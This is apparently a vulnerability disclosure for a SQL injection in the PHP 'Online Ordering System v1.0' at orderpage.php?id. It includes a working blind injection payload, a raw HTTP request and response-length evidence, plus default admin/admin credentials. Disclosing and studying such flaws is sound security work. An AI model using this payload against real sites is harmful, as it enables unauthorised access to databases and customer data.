# Online Ordering System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin

vendors: https://www.sourcecodester.com/php/5125/online-ordering-system-using-phpmysql.html

Vulnerability File: /onlineordering/store/orderpage.php

Vulnerability location: /onlineordering/store/orderpage.php?id=,id

[+] Payload: /onlineordering/store/orderpage.php?id=12%27%20and%20length(database())%20=12--+ // Leak place ---> id

Current database name: shoppingcart,length is 12

```sql
GET /onlineordering/store/orderpage.php?id=12%27%20and%20length(database())%20=12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=v112m4jpgqqtdo86av7lvbjv3l
Connection: close
```

When length (database (()) = 11, Content-Length: 3541

![image](https://user-images.githubusercontent.com/54017627/167339477-32c0e941-d883-4759-9d91-951fea502d9e.png)

![image](https://user-images.githubusercontent.com/54017627/167339531-5bec577f-f7e4-4a03-8cf5-3e2038538f6d.png)

When length (database (()) = 12, Content-Length: 2529

![image](https://user-images.githubusercontent.com/54017627/167339441-ca008099-e321-4c0f-b764-4c697d6c6737.png)

![image](https://user-images.githubusercontent.com/54017627/167339504-d3b8b511-45d0-46ad-8160-162f27124636.png)
